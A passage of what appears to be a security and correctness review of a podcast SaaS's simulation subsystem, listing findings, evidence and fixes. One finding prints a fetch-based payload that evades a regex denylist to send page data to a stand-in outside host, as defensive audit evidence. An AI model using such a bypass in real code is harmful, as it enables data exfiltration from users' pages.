# Simulation subsystem — findings

Reviewer: `simulation-reviewer`. Commit under review: `2d187e3` (main).
Scope: `podcast-saas/backend-api/src/services/simulation/**`, `podcast-saas/shared/src/sim/**`,
`controllers/sim-public.controller.ts`, `controllers/sim-rum.controller.ts`,
`controllers/v1/simulations.controller.ts`, the `simulations` / `sim_revisions` / `sim_posters` /
`sim_rum_events` tables, and (read-only, cross-boundary) `client-web/lib/sim/**` plus the four
sim-related Playwright configs.

**Headline: the immutable-revision pointer landed on the READ path but three WRITE paths were never
moved.** "Replace simulation", "Publish guidance" and the LLM source-context read all still operate
on the legacy mutable prefix, which a revisioned simulation no longer serves. Two of them report
success while changing nothing a viewer can see.

---

### [P1] "Replace simulation" writes to a prefix the player no longer serves — the replace is a silent no-op
- id: simulation-001
- location: podcast-saas/backend-api/src/services/simulation/SimulationService.ts:2614
- category: bug
- confidence: high
- status: confirmed
- what: `processReplace` uploads every replacement file to `simulations/<projectId>/<simId>/<relPath>`
  — the legacy mutable prefix — and explicitly preserves the `revisions/` subtree
  (`isSystemOwnedKey`, SimulationService.ts:2569). It never creates a revision draft and never flips
  `simulations.active_revision_entry_key`. But `resolveSimulationUrl`
  (simulationUrlResolver.ts:72-74) ignores the stored URL entirely and returns
  `getSimPublicUrl(active_revision_entry_key) + <query>` whenever that pointer is set. Every
  simulation that has ever had a section bridge generated has that pointer set
  (`uploadSectionBridge` activates a revision at SimulationService.ts:3189-3198).
- why: The endpoint runs the compatibility gate, CAS-claims the row, uploads the bytes, deletes the
  stale keys, sets `status: 'ready'` and logs `Simulation files replaced`
  (simulations.controller.ts:428-436). The Files tab and `download.zip` then list the NEW bytes
  (they list the same legacy prefix). The player and the editor keep loading the OLD revision's
  package, forever — there is no later step that promotes the replaced files into a revision. A
  customer who fixes a bug in their simulation and re-uploads it sees every success signal the
  product can give and no change in the video.
- evidence: Read `simulations.controller.ts:263-449` (the whole replace handler — no RevisionService
  call anywhere), `SimulationService.ts:2524-2645` (`processReplace`, `prefix` computed at :2538,
  uploads at :2610-2618), `simulationUrlResolver.ts:67-75`, `buildPlayerConfig.ts:444,501`
  (viewer), `controllers/v1/sections.controller.ts:130` and `editor-state.controller.ts:89`
  (editor, via `withServedSimulationUrls`). `grep -rn "new RevisionService\|RevisionService("
  backend-api/src` returns only `SimulationService.ts:2408` and `RevisionMigration.ts:158` —
  neither on the replace path.
- fix: Make the replace path publish a revision instead of mutating the prefix. In
  `simulations.controller.ts`, when `sim.active_revision_id` is non-null, route the decoded
  `fileMap` through `RevisionService.createDraft → beginUpload → writeFile(...) → finishUpload →
  validate → activate` with `expectedActiveRevisionId = sim.active_revision_id`, exactly as
  `uploadSectionBridge` does, preserving the current bridge.js as `package/bridge.js`. Until that
  lands, the minimum honest change is to refuse the replace with 409 when
  `sim.active_revision_id !== null`, naming the reason, rather than returning 202.
- verify: New test: seed a simulation with an active revision, POST `/replace`, assert either a 409
  or that `simulations.active_revision_entry_key` names a NEW revision whose entry bytes are the
  uploaded ones. Red before, green after.
- cross: @backend-reviewer @database-reviewer
- effort: L

---

### [P1] "Publish guidance" writes guidance.js and the entry HTML to the same unserved legacy prefix
- id: simulation-002
- location: podcast-saas/backend-api/src/services/simulation/GuidanceService.ts:572
- category: bug
- confidence: high
- status: confirmed
- what: `publishGuidance` computes `prefix = simulations/${projectId}/${simId}`
  (GuidanceService.ts:534), uploads `guidance.js` to `${prefix}/guidance.js` (:572-575), and
  injects the `<script>` tag into the entry HTML resolved from `opts.entryKey` — which the
  controller passes as `owned.sim.entry_file` (simulations.controller.ts:853). `entry_file` is
  written only by the upload and replace handlers (simulations.controller.ts:226, :431); revision
  activation never touches it, so on a revisioned simulation it permanently names the legacy
  document. The document the player actually loads
  (`revisions/<id>/package/<entry>`) is never given the guidance tag.
- why: The guidance draft → TTS → publish flow bills ElevenLabs for every enabled cue, marks
  `guidance_status: 'ready'`, and then rewrites every section's `simulation_url` with a
  `?g=<guidanceHash>` cache-bust (simulations.controller.ts:865-876). Because
  `resolveSimulationUrl` appends the stored query verbatim onto the revision entry key, the only
  observable effect is that every section's iframe reloads a revision document that has no
  guidance.js in it. Paid-for audio that never plays, plus N un-transacted row writes per publish.
- evidence: Read `GuidanceService.ts:525-600`, `simulations.controller.ts:816-893`,
  `simulationUrlResolver.ts:72-74`. `grep -n "entry_file:" controllers/v1/simulations.controller.ts`
  → only lines 226 and 431; `grep -n "entry_file" services/simulation/RevisionService.ts` → no hits.
- fix: Resolve the entry document from the revision, not from `simulations.entry_file`: when
  `active_revision_id` is set, publish guidance as a new revision (read the active revision's
  manifest, copy every file, add `package/guidance.js`, rewrite `package/<entry>`, activate) —
  the same shape `uploadSectionBridge` already implements. Short of that, refuse guidance
  publication on a revisioned simulation with an explicit error instead of charging for TTS.
- verify: Test: simulation with an active revision + one enabled cue → publish → assert the bytes at
  `active_revision_entry_key` contain `SIM_GUIDANCE_SCRIPT_START`.
- cross: @backend-reviewer @billing-integrity-reviewer
- effort: L

---

### [P1] Bridge generation reads its source context from the legacy prefix but publishes a copy of the active revision
- id: simulation-003
- location: podcast-saas/backend-api/src/services/simulation/SimulationService.ts:2677
- category: bug
- confidence: medium
- status: confirmed
- what: `generateBridgeScript` builds the LLM context from `this.listSimKeys(prefix)` where `prefix`
  is the LEGACY mutable prefix (SimulationService.ts:2667, 2677-2706), so the model is shown
  whatever bytes currently sit there. `uploadSectionBridge`, which publishes the result, takes its
  base package from the ACTIVE REVISION's manifest when `active_revision_id` is set
  (SimulationService.ts:3033-3060) and copies those files into the new revision. The two sources are
  the same only while nothing has written to the legacy prefix since the last publication — which
  finding simulation-001 makes routine.
- why: After a replace, the generated section body is written against the NEW simulation's ids,
  classes, label text and window globals, and is then published into a package containing the OLD
  files. That is precisely the failure `SimBridgeContract.ts` was built to prevent ("the section
  body then finds nothing and no-ops, and the sub-simulation is dead in production with no error",
  SimBridgeContract.ts:13-14) — and `checkReplaceCompatibility` cannot catch it, because it runs on
  the replace path and compares against `${sim.storage_prefix}/bridge.js`
  (simulations.controller.ts:381-384), the legacy bridge, not the live one inside the revision.
- evidence: Read `SimulationService.ts:2665-2733` (context read) and `:3020-3098` (publication
  base). `listSimKeys(prefix)` is called with the legacy prefix only. `simulations.controller.ts:382`
  reads the legacy `bridge.js` for the gate; the live bridge for a revisioned sim is at
  `revisions/<activeId>/package/bridge.js` (`bridgeManifestPath` at SimulationService.ts:3027).
- fix: Give `generateBridgeScript` the same base resolution `uploadSectionBridge` uses: when
  `active_revision_id` is set, read the source map from the active revision's manifest files
  (`revisionFileKey(prefix, activeId, f.path)`) rather than from `listSimKeys(legacyPrefix)`.
  Likewise, have the replace handler read `bridgeJs` for the compatibility gate from
  `revisionFileKey(sim.storage_prefix, sim.active_revision_id, 'package/bridge.js')` when a
  revision is active.
- verify: Test: simulation with an active revision whose legacy prefix has been overwritten with
  different files; assert the source map handed to `buildContextPrompt` matches the revision's
  manifest, not the legacy listing.
- cross: @llm-pipeline-reviewer
- effort: M

---

### [P2] Every served simulation document installs four `message` listeners with no origin or source check
- id: simulation-004
- location: podcast-saas/backend-api/src/services/simulation/SimulationService.ts:1791
- category: security
- confidence: high
- status: confirmed
- what: Four listeners run inside the sim iframe and none validates `event.origin` or
  `event.source`:
  1. the rAF gate — `SimulationService.ts:607` (`simPause`/`simResume`/`listSimControls`/
     `simMute`/`simUnmute`/`simRelayout`/`PING_SIM_PAINTED`);
  2. the v2 combined bridge — `SimulationService.ts:1791` (`startScript`/`stopScript`/`uiPolicy`/
     `autoPolicy`/`pauseScript`/`PING_SIM_READY`);
  3. the published guidance overlay — `GuidanceService.ts:357` (`guidanceInit`/`guidanceFired`/
     `guidanceGate`/`startScript`/`stopScript`);
  4. the serve-time boot snippet — `sim-public.controller.ts:48` (`clearBootHide`).
  Every outbound message goes to `'*'` (`_post`, SimulationService.ts:1500;
  GuidanceService.ts:294). The v3 child, by contrast, checks both (`e.source !== win.parent` and
  `d.parentOrigin !== e.origin`, simRuntimeChild.ts:1154-1158), so the gap is a known and closable
  one — the rAF gate's own header even says "Accepts any origin, matching the existing bridge
  listener pattern" (SimulationService.ts:295).
- why: Any window holding a handle to a sim document (`window.open()` on the public
  `/sim-public/...` URL from any origin; a nested third-party frame inside the customer's own
  package; another same-origin API document) can drive the section lifecycle: swap the running
  sub-simulation, stop it, force the Minimal-UI hide set, mute it, or suppress every guidance cue.
  It is not an auth bypass — `frame-ancestors` (sim-public.controller.ts:184) blocks reframing and
  the hide-selector sanitiser (`/[{}<\\]/`, SimulationService.ts:1485) blocks CSS breakout — so
  this is defence-in-depth, not P0. It is also the listener the codebase already blames for one
  production defect (the prototype-name dispatch wedge, SimulationService.ts:1670).
- evidence: Read SimulationService.ts:607-622 and :1791-1807 (no `e.origin`/`e.source` reference in
  either handler), GuidanceService.ts:357-364, sim-public.controller.ts:41-50. Contrast
  simRuntimeChild.ts:1150-1160.
- fix: Emit the allowed parent origins into the generated bridge/gate/guidance/boot sources at
  publication time (the backend already computes them: `browserOrigins()`,
  `config/publicOrigins.ts`, used at sim-public.controller.ts:169) and start every one of the four
  handlers with `if (e.source !== window.parent) return; if (ALLOWED.indexOf(e.origin) === -1)
  return;`. Then replace `postMessage(msg, '*')` with the resolved parent origin once the first
  accepted message has established it.
- verify: `backend-api/src/services/simulation/__tests__/bridgeIntegration.test.ts` — add a case
  asserting the emitted bridge source contains the origin guard; add a Playwright case in
  `e2e/sim-protocol.spec.ts` posting `startScript` from a foreign origin and asserting no section
  change.
- cross: @security-reviewer
- effort: M

---

### [P2] Four declared child→parent acknowledgements are silently dropped by the production parent
- id: simulation-005
- location: podcast-saas/client-web/lib/sim/SimRuntimeClient.ts:1411
- category: bug
- confidence: high
- status: confirmed
- what: `PARENT_INBOUND_TYPES` (runtimeProtocol.ts:471-477) admits `QUALITY_APPLIED`,
  `AUTOMATION_PAUSED`, `AUTOMATION_RESUMED` and `SECTION_RELEASED`, and the child posts all four
  (simRuntimeChild.ts:1026, :873, :882, :963). `SimRuntimeClient.onEnvelope` has no `case` for any
  of them — they fall through to `default: return;` at SimRuntimeClient.ts:1411-1412 and are not
  even counted in telemetry.
- why: `setQuality()`'s own docstring states the opposite contract: "A package that cannot answers
  `unsupported`, which is reported rather than treated as applied — an adaptive-quality policy built
  on an unverified assumption that the switch landed would be tuning against a value nothing
  changed" (SimRuntimeClient.ts:1991-1995). Nothing reports it. Likewise `AUTOMATION_PAUSED`
  carries `stopped` "so the parent can tell 'paused 3 timers' from 'there was nothing registered to
  pause'" (simRuntimeChild.ts:870-872) — the parent cannot, because it never reads it. The four
  messages are asserted by the Playwright suites (`e2e/sim-canary.spec.ts:1407,1437,1510`,
  `e2e/sim-transport.spec.ts:1439,1621`), which observe raw envelopes through a harness rather than
  through `SimRuntimeClient`, so the drift is invisible to the tests.
- evidence: `grep -n "QUALITY_APPLIED\|SECTION_RELEASED\|AUTOMATION_PAUSED\|AUTOMATION_RESUMED"
  client-web/lib` → zero hits outside the import list at SimRuntimeClient.ts:73-99 (the four are not
  even imported). Read SimRuntimeClient.ts:1188-1414 for the full switch.
- fix: Add the four cases. `QUALITY_APPLIED` → `this.tel('modern-quality-applied', {profile,
  outcome})` and record `outcome` on the client state so an adaptive controller can read it;
  `AUTOMATION_PAUSED`/`AUTOMATION_RESUMED` → `matchesActivation` + telemetry with the `stopped` /
  `restarted` counts; `SECTION_RELEASED` → telemetry, and use it to settle the release leg of
  `evictPhaseOne` instead of relying solely on the grace timer.
- verify: `client-web/__tests__/simRuntimeClientModern.test.ts` — feed each of the four envelopes and
  assert the telemetry callback fires. Red before, green after.
- cross: @frontend-reviewer @types-contracts-reviewer
- effort: S

---

### [P2] Every revision records `bridge_protocol_version` and `runtime_protocol_version` as 0
- id: simulation-006
- location: podcast-saas/backend-api/src/services/simulation/RevisionMigration.ts:361
- category: data-integrity
- confidence: high
- status: confirmed
- what: `buildLegacyManifest` hardcodes `bridgeProtocolVersion: 0` and `runtimeProtocolVersion: 0`
  (RevisionMigration.ts:361-362), and it is the ONLY manifest builder in the codebase. Both
  publication paths use it: the operator migration (RevisionMigration.ts:294) and the live
  section-bridge publication (SimulationService.ts:3158). `RevisionService.validate` copies those
  two values straight into the columns (RevisionService.ts:423-424). So every row of
  `sim_revisions` reports 0 — including revisions whose bridge embeds the v3 child runtime
  (`wrapBridgeCombined(sectionEntries, { runtimeV3: true })`, SimulationService.ts:1918, which emits
  `SIM_PROTOCOL_VERSION = 3` / `SIM_CHILD_RUNTIME_VERSION = 2`).
- why: These two columns are the only per-revision record of which wire protocol a stored package
  speaks. They are exactly what a protocol bump would need in order to find the packages that must
  be rebuilt — the scenario `runtimeProtocol.ts:48-53` describes ("the parent refuses a child
  advertising a different major version"). With a constant 0 there is no query that answers "which
  stored revisions are on the old runtime", and the fields also contribute a constant to
  `computeManifestHash` (simManifest.ts:355-356), so two revisions differing only by runtime version
  hash identically. The comment justifying 0 is about legacy packages ("the bytes predate the
  versioned runtime"), which is true for the migration path and false for the live path.
- evidence: `grep -rn "bridgeProtocolVersion\|runtimeProtocolVersion" backend-api/src shared/src`
  → the only writers are RevisionMigration.ts:361-362 and the report script; the only reader is
  RevisionService.ts:423-424 (write-through) and ProjectDuplicationService.ts:1269-1270 (copy).
- fix: Add `bridgeProtocolVersion` / `runtimeProtocolVersion` to `buildLegacyManifest`'s options
  with the current defaults for the legacy path, and have `uploadSectionBridge` pass the real
  values — `SIM_PROTOCOL_VERSION` (3) and `SIM_CHILD_RUNTIME_VERSION` (2) from
  `simRuntimeChild.ts` — for every bridge it emits with `runtimeV3: true`.
- verify: `__tests__/revisionService.test.ts` — publish through `uploadSectionBridge` and assert
  `sim_revisions.runtime_protocol_version = 2`.
- cross: @database-reviewer
- effort: S

---

### [P2] `/sim-public/*` serves any key under `simulations/` with no publication or visibility check
- id: simulation-007
- location: podcast-saas/backend-api/src/controllers/sim-public.controller.ts:123
- category: security
- confidence: high
- status: confirmed
- what: The only gate on the unauthenticated route is `key.startsWith('simulations/') &&
  !keyHasTraversal(key)`. Nothing consults `projects.visibility`, `simulations.status`, or
  `sim_revisions.status`. A `draft`, `uploading`, `validating`, `failed`, `retired` or
  `rolled_back` revision's bytes are served exactly like the active one, and a simulation belonging
  to a private, never-published project is served to anyone who has the URL.
- why: This is a capability-URL design (both ids in the path are UUIDs, so the keys are not
  enumerable) and public serving is the point of the route — so it is not P0. But two properties are
  weaker than they look: (a) a *withdrawn* revision stays publicly readable until `gc()` runs, so a
  rollback does not revoke access to the bytes that were rolled back; and (b) an aborted publication
  leaves a `failed` draft's bytes readable indefinitely (`gc` only runs when someone calls it —
  `grep -rn "\.gc(" backend-api/src` finds no production caller). Combined with a share-link leak,
  a customer's un-published work is retrievable.
- evidence: Read sim-public.controller.ts:115-292 end to end — the only `db` import in the file is
  via `isVerifiedRevisionKey`, which asks whether a row EXISTS, never what its status is
  (revisionIdentity.ts:96-105). `grep -rn "\.gc(" backend-api/src` → only
  `__tests__/revisionService.test.ts`.
- fix: Extend `isVerifiedRevisionKey` into a `resolveServableRevision(key)` that returns the row's
  `status` as well, and have the handler 404 for any key inside a `revisions/<id>/` prefix whose
  row is not in `{active, retired, rolled_back}` — draft/uploading/validating/failed bytes should
  never be public. Separately, wire `RevisionService.gc` into the existing retention machinery so
  withdrawn bytes actually expire.
- verify: `controllers/__tests__/sim-public.test.ts` — seed a `failed` revision, request one of its
  files, assert 404.
- cross: @security-reviewer @backend-reviewer
- effort: M

---

### [P2] Posters are never invalidated or swept on the production publication path
- id: simulation-008
- location: podcast-saas/backend-api/src/services/simulation/PosterService.ts:218
- category: data-integrity
- confidence: high
- status: confirmed
- what: `PosterService.invalidate` and `PosterService.cleanupOrphans` have exactly one caller in the
  repository — `scripts/sim-canary-publish.ts:322` — and it is an operator script. The ordinary
  publication path (`uploadSectionBridge`) mints a brand-new `packageRevision`
  (`packageRevisionFor` → `sha256('rev\0' + revisionId)`, simRevision.ts:129-133) on every single
  section-bridge generation, and every `sim_posters` row is keyed on that value
  (PosterService.ts:161-169).
- why: One full set of poster rows and objects is stranded per publication, forever. `gc()` deletes
  only `revisionFileKey(prefix, revId, '')` prefixes (RevisionService.ts:806) while posters live at
  `<simPrefix>/posters/<identity>/…` (posterIdentity.ts:148-150), so even a GC sweep leaves them.
  The bytes are stored `public, max-age=31536000, immutable` (PosterService.ts:110). Nothing serves
  a *wrong* poster — the identity genuinely differs — but a simulation edited weekly accumulates
  unbounded rows in a table the player queries and unbounded objects in the bucket, with no path
  that ever reclaims either.
- evidence: `grep -rn "posterService\.\|cleanupOrphans(" backend-api/src` (excluding tests) →
  `scripts/sim-canary-publish.ts:276,322` and the definitions. Read RevisionService.ts:770-842 (`gc`
  never lists `posters/`), posterIdentity.ts:131-150.
- fix: Call `posterService.invalidate(simId, newPackageRevision)` inside `uploadSectionBridge`'s
  `onActivated` hook (RevisionService.ts:715 runs it in the activation transaction, so the row
  deletes commit atomically with the pointer flip; the object deletes follow it). Add the poster
  root to `RevisionService.gc`'s sweep for revisions it collects.
- verify: `__tests__/posterService.test.ts` — publish twice, assert only the current revision's
  poster rows survive.
- cross: @database-reviewer @performance-reviewer
- effort: M

---

### [P2] An async `SECTION_ERROR` from a superseded activation is stamped with the CURRENT activation's identity
- id: simulation-009
- location: podcast-saas/backend-api/src/services/simulation/simRuntimeChild.ts:1097
- category: bug
- confidence: medium
- status: confirmed
- what: `runMaybeAsync`'s rejection handler posts `post('SECTION_ERROR', {...}, current)` — reading
  the module-level `current` at REJECTION time, not the activation the call belonged to
  (simRuntimeChild.ts:1089-1102). `onPrepare` releases the previous activation and installs a new
  `current` synchronously (simRuntimeChild.ts:771-782). So a promise returned by the previous
  activation's `prepare`/`present`/`activate` that rejects after the switch mints an envelope
  carrying the NEW activation's `activationId`/`variantKey`/`configHash`. The parent's
  `matchesActivation` therefore accepts it and calls
  `failModern('section-error', …)` (SimRuntimeClient.ts:1396-1399), tearing down a healthy section
  and opening the breaker. The symmetric case — `current === null` — produces an envelope with no
  `activationId`, which the parent rejects as `missing-activation-id`
  (runtimeProtocol.ts:449-453), so the error is lost instead.
- why: This is exactly the "a message that is TRUE about some past state arrives and is applied to
  the present" class that simIdentity.ts:4-10 exists to close, arriving through the error path the
  identity checks do not cover. **Not reachable in production today**: `runMaybeAsync` only sees a
  promise for a MANAGED lifecycle body, and the generator emits cleanup-closure bodies that
  `toLifecycle` wraps as legacy with a synchronous `present` (simRuntimeChild.ts:727-744, and see
  SimulationService.ts:1910-1917). It becomes reachable the moment the generator learns to emit
  `ManagedSectionLifecycle` bodies, which is a stated roadmap item.
- evidence: Read simRuntimeChild.ts:1089-1102 (`current` is not a parameter and is not captured),
  :767-782 (`releaseCurrent` then reassign), :959-977. Contrast the `markPresented` path at :838-843,
  which correctly captures `var activation = current` and re-checks it.
- fix: Capture the activation in `runMaybeAsync` the way `onPresent` already does: add an
  `activation` parameter, have every caller pass `current` at call time, and drop the post entirely
  when `!current || current.activationId !== activation.activationId`.
- verify: `__tests__/SimulationServicePhase4Contract.test.ts` (or a new child-runtime test): drive
  PREPARE(A) with a rejecting promise, PREPARE(B), settle the rejection, assert no envelope carries
  B's activationId.
- effort: S

---

### [P3] The child-runtime version is not in the marker, and the strip/detect helpers have no caller
- id: simulation-010
- location: podcast-saas/backend-api/src/services/simulation/simRuntimeChild.ts:40
- category: maintainability
- confidence: high
- status: confirmed
- what: `SIM_CHILD_MARKER_START` / `_END` interpolate only `SIM_PROTOCOL_VERSION` (3), not
  `SIM_CHILD_RUNTIME_VERSION` (2) — the latter appears solely inside a comment line
  (simRuntimeChild.ts:1225). `hasChildRuntime` therefore answers "yes" for a bridge carrying child
  runtime v1, which predates `SET_UI_POLICY`/`SET_AUTOMATION_POLICY` and the `policies`
  advertisement. And neither `hasChildRuntime` nor `stripChildRuntime` is called anywhere:
  `grep -rn "hasChildRuntime\|stripChildRuntime" backend-api/src client-web shared/src` finds only
  their own definitions.
- why: The module header claims these markers are "what makes regenerating a bridge idempotent — the
  property the rebuild tooling in Priority 1 proves for every stored package"
  (simRuntimeChild.ts:1214-1216). Nothing proves it, and no tool can currently find a stored package
  whose embedded runtime is stale. Regeneration happens to be safe today only because
  `wrapBridgeCombined` rebuilds from `parseSectionEntries` rather than appending.
- evidence: Read simRuntimeChild.ts:38-41, 1218-1247. Grep as above.
- fix: Put both numbers in the markers (`@@SIM_RUNTIME_V3.2_START@@`) and add a
  `staleChildRuntime(bridgeJs): boolean` used by `scripts/rebuild-sim-bridges.ts` to select
  packages — or delete `stripChildRuntime`/`hasChildRuntime` and the idempotency claim in the
  header, so the file stops promising a guarantee nothing enforces.
- effort: S

---

### [P3] The RUM retention sweep runs on every API replica
- id: simulation-011
- location: podcast-saas/backend-api/src/server.ts:509
- category: perf
- confidence: high
- status: confirmed
- what: `startRumRetentionSweep()` is called unconditionally during server bootstrap, with no
  advisory lock, leader election, or env gate. It schedules an hourly `run` plus an immediate
  `setTimeout(run, 0)` (RumService.ts:141-148). With N API replicas behind nginx, N processes issue
  the same `DELETE … WHERE ctid IN (SELECT ctid … LIMIT 5000)` at boot and hourly.
- why: The statement is bounded (RUM_REAP_BATCH, RumService.ts:236) and the loop is bounded to 1000
  passes, so this is not an outage risk — but concurrent transactions selecting overlapping `ctid`
  sets block each other on row locks against a connection pool the comment in
  sim-rum.controller.ts:66 already calls "a small target", and the work is pure duplication. It is
  also the only sweep in the product without an ownership rule.
- evidence: Read server.ts:500-512 and RumService.ts:124-150. The worker entrypoint
  (`src/worker.ts`) does not call it, so the sweep is API-only by construction.
- fix: Gate it behind a Postgres advisory lock (`pg_try_advisory_lock`) taken inside `reapRumEvents`,
  or move the call to `worker.ts` and delete it from `server.ts` — the sweep has no reason to live
  in the request-serving process at all.
- cross: @job-queue-reviewer @observability-reviewer
- effort: S

---

### [P3] `fieldAggregates` interpolates a raw `Date` into a raw `sql` fragment, the construct the file itself documents as broken on the production driver
- id: simulation-012
- location: podcast-saas/backend-api/src/services/simulation/RumService.ts:442
- category: bug
- confidence: low
- status: suspected
- what: `AND created_at >= ${cutoff}` passes a JS `Date` into a `drizzle` raw `sql` template.
  180 lines above, `reapRumEvents` passes `${cutoff.toISOString()}::timestamptz` with a long comment
  stating that the Date form "throws ERR_INVALID_ARG_TYPE before the statement is ever sent, so the
  hourly sweep failed on every tick. PGlite, which the unit suite runs on, accepts the Date happily,
  so no test could see it" (RumService.ts:251-258).
- why: If that account is accurate for this driver version, field-aggregate refinement is dead in
  production and the `catch` at RumService.ts:457-467 turns it into an empty map — the exact silent
  degradation that catch block's own comment describes having happened once already. I could not
  confirm the mechanism: reading `postgres@3.4.9`'s `inferType`
  (`node_modules/.pnpm/postgres@3.4.9/.../src/types.js:220-229`) shows `Date → 1184` with a
  serializer, and drizzle's postgres-js session routes params through `client.unsafe(query, params)`
  which does apply `handleValue`/`inferType` (`src/connection.js:230`). So the two halves of the
  codebase disagree and only one of them can be right.
- evidence: RumService.ts:442 vs :259-263; the only coverage is `__tests__/rumService.test.ts:605+`,
  which runs on PGlite (the engine the comment says cannot see the difference).
- fix: Make the two statements agree — use `${cutoff.toISOString()}::timestamptz` in
  `fieldAggregates` too. It is correct under either reading and costs nothing. Then either delete the
  claim in the `reapRumEvents` comment or add a real-Postgres integration test that pins it.
- verify: One boot against a real Postgres with `SIM_RUM_SAMPLE_RATE` on and a project containing a
  simulation; assert no `sim RUM field aggregates unavailable` warning.
- cross: @database-reviewer @test-quality-reviewer
- effort: S

---

### [P3] The modern-publication gate accepts single-engine evidence while the canary config defaults to Chromium only
- id: simulation-013
- location: podcast-saas/backend-api/src/services/simulation/canaryJudge.ts:258
- category: test
- confidence: high
- status: confirmed
- what: `mayPublishAsModern(report)` requires `managed-presentable`, an honest stamp and a complete
  run — but says nothing about how many engines the report covers. `playwright.canary.config.ts`
  runs Chromium only unless `CANARY_ALL_ENGINES` is set (playwright.canary.config.ts:38-46), and
  `mergeCanaryReports` is only reachable if an operator calls it explicitly.
- why: `mergeCanaryReports`' own header states the principle: "A guarantee that holds in Chromium and
  not in WebKit is not a guarantee" (canaryJudge.ts:337-339). The three suites that DO enforce
  all-engines by default (protocol, transport, sim-transitions) are the ones whose configs say so
  loudly; the one that is an actual publication gate is the one that opts out.
- evidence: Read canaryJudge.ts:250-262 and playwright.canary.config.ts:36-47. Contrast
  playwright.protocol.config.ts:48-52 and playwright.transport.config.ts:46-50.
- fix: Either make `CANARY_ALL_ENGINES` the default in `playwright.canary.config.ts`, or have
  `mayPublishAsModern` additionally require that `report.engine` names every engine in a declared
  `REQUIRED_CANARY_ENGINES` set — so a single-engine report is refused by the gate rather than by
  an operator remembering a flag.
- cross: @test-quality-reviewer
- effort: S

---

### [P3] `PATCH /guidance` validates `trigger` as `z.any()`, so an arbitrary predicate body is stored unvalidated
- id: simulation-014
- location: podcast-saas/backend-api/src/controllers/v1/simulations.controller.ts:54
- category: security
- confidence: high
- status: confirmed
- what: `StoredGuidanceEntrySchema.trigger` is `z.any()`, while the generation-time schema is a
  proper discriminated union (`GuidanceEntrySchema`, GuidanceService.ts:66-80). So the editor can
  PATCH a `config` trigger whose `predicateBody` is arbitrary JavaScript, and it is persisted
  verbatim into `simulations.guidance`.
- why: `publishGuidance` does re-scan with `scanPredicate` before baking
  (GuidanceService.ts:548-555), so this is not an unguarded code-injection sink. But
  `PREDICATE_BANS` (GuidanceService.ts:153-169) is a regex denylist and is bypassable —
  `S.global('fetch')('https://x/'+S.text('id'))` uses no banned token, and the sim CSP allows
  `connect-src https:` (sim-public.controller.ts:183). The saving grace is that the same principal
  can already upload arbitrary JS as part of the package, so there is no privilege escalation; the
  defect is that a route whose declared contract is "narration text and enabled flags"
  (simulations.controller.ts:775) in fact accepts executable code.
- evidence: simulations.controller.ts:48-58 (`trigger: z.any()`), :784-790 (stored verbatim);
  GuidanceService.ts:153-169, :202-207, :278-282.
- fix: Replace `z.any()` with the same discriminated union `GuidanceService` exports, and reject a
  PATCH whose `trigger.predicateBody` differs from the stored draft's — the editor's job on this
  route is narration and `enabled`, not trigger authoring.
- cross: @security-reviewer @types-contracts-reviewer
- effort: S

---

### [P3] The Files tab and `download.zip` show the legacy prefix, not the bytes being served
- id: simulation-015
- location: podcast-saas/backend-api/src/controllers/v1/simulations.controller.ts:470
- category: ux
- confidence: high
- status: confirmed
- what: `GET /simulations/:simId/files` lists `sim.storage_prefix` (line 470) and
  `download.zip` zips the same listing (line 641). On a revisioned simulation those are the legacy
  mutable bytes; the served package is `revisions/<activeId>/package/…`. `GET /ui-controls`
  (line 606-610) and `GET /file-content` (line 563) read from the same place.
- why: On its own this is a display inconsistency. Combined with simulation-001 it is what makes the
  no-op replace convincing: the customer uploads new files, the Files tab shows them, the download
  contains them, and the player shows the old package. It also makes the Minimal-UI picker scan a
  document the viewer never loads.
- evidence: simulations.controller.ts:465-543, :628-663, :593-625. `sim.storage_prefix` is the
  legacy root (`simulations/<projectId>/<simId>`); the served entry is
  `simulations.active_revision_entry_key`.
- fix: When `sim.active_revision_id` is set, list/read/zip from
  `revisionPrefix(sim.storage_prefix, sim.active_revision_id) + '/package/'` and strip that prefix
  in the returned relative paths, so the Files tab describes the package the player runs.
- cross: @backend-reviewer @ui-ux-reviewer
- effort: M

---

### [P3] `RevisionService.validate` read-modify-writes `metadata` where `markFailed` deliberately merges in SQL
- id: simulation-016
- location: podcast-saas/backend-api/src/services/simulation/RevisionService.ts:411
- category: data-integrity
- confidence: medium
- status: suspected
- what: `validate()` sets `metadata: { ...(rev.metadata ?? {}), weight: {…} }` from the in-memory
  record it was handed. `markFailed()` on the same column uses
  `COALESCE(metadata,'{}'::jsonb) || …::jsonb` and its comment explains why: "`transition` writes
  `extra` straight into `.set()`, so a plain `{ error }` object clobbered the whole metadata
  column" (RevisionService.ts:300-307). That comment then claims "`validate` merges for the same
  reason a few lines down" — it does not; it merges in JavaScript, from a snapshot.
- why: Any write to `sim_revisions.metadata` landing between `finishUpload()` and `validate()` is
  silently discarded, including `bridgeCapabilities` — the record the apply gate and the browser
  capability floor both depend on (bridgeCapability.ts:5-32). I could not find such a writer today:
  `scripts/backfill-bridge-capabilities.ts:369` is the only other `metadata` writer and it targets
  the ACTIVE revision, which is never in `validating`. So this is latent, not live.
- evidence: RevisionService.ts:244-267 (`transition` splices `extra` into `.set()`), :308-310
  (SQL merge), :410-425 (JS merge). `grep -rn "sim_revisions" backend-api/src | grep metadata`.
- fix: Use the same `sql\`COALESCE(${sim_revisions.metadata},'{}'::jsonb) || ${JSON.stringify({weight})}::jsonb\``
  form in `validate`, and correct the comment at RevisionService.ts:306-307.
- verify: `__tests__/revisionService.test.ts` — write a metadata key between `finishUpload` and
  `validate`, assert it survives.
- cross: @database-reviewer
- effort: S

---

## What was checked and found sound

- **Handshake liveness.** Every wait on the v3 path is bounded: `SIM_BOOTSTRAP_TIMEOUT_MS`
  (SimTransport.ts:213-224), `prepare-timeout` / `present-timeout` (SimRuntimeClient.ts:1498, 1532),
  `SIM_CONTEXT_RESTORE_TIMEOUT_MS` (SimRuntimeClient.ts:1268-1273), `SIM_DISPOSE_TIMEOUT_MS`
  (SimRuntimeClient.ts:2262+). `SUSPEND_DOCUMENT` / `SET_AUDIBLE` / `SET_QUALITY` / the two policy
  commands are fire-and-forget with no blocking wait, so a silent child cannot deadlock the parent.
  I found no unbounded wait.
- **Version negotiation.** `validateEnvelope` rejects on `protocolVersion !== SIM_PROTOCOL_VERSION`
  before touching any other field (runtimeProtocol.ts:428-431), the child mirrors it
  (simRuntimeChild.ts:695), and the bootstrap offer/accept both carry the version
  (simRuntimeChild.ts:1157, SimTransport.ts:96-101). An old cached child cannot mis-parse a new
